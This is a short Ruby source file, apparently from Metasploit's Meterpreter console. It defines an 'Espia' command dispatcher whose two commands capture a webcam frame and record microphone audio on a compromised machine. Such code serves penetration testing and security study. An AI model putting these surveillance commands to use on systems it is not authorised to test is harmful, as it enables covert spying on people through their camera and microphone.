require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Nah
#
###
class Console::CommandDispatcher::Espia

	Klass = Console::CommandDispatcher::Espia

	include Console::CommandDispatcher

	#
	# Initializes an instance of the espia command interaction.
	#
	def initialize(shell)
		super
	end

	#
	# List of supported commands.
	#
	def commands
		{
			"dev_image" => "Attempt to grab a frame from webcam",
			"dev_audio" => "Attempt to record mic audio"			
		}
	end
	
	def cmd_dev_image()
		client.espia.espia_video_get_dev_image()
		print_line("[*] Done.")
		
		return true
	end
	
	def cmd_dev_audio()
		client.espia.espia_audio_get_dev_audio()
		print_line("[*] Done.")
		
		return true
	end

	#
	# Name for this dispatcher
	#
	def name
		"Espia"
	end

end

end
end
end
end